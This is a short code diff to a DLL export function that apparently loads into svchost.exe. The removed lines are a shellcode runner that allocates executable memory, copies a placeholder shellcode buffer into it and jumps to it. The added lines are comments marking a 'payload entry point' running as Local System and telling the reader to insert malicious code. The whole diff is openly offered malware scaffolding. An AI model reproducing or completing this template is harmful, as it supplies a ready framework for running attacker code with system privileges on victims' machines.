@@ -10,10 +10,9 @@ extern "C" {
         PWSTR pwszDllName,
         void* ptpPI
     ) {
-        unsigned char shellcode[] = {"0%"};
-        void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        memcpy(exec, shellcode, sizeof(shellcode));
-        ((void(*)())exec)();
+        
+        // PAYLOAD ENTRY POINT - Runs in svchost.exe (Local System)
+        // Replace this section with your malicious code
         return ERROR_SUCCESS;
     }
 
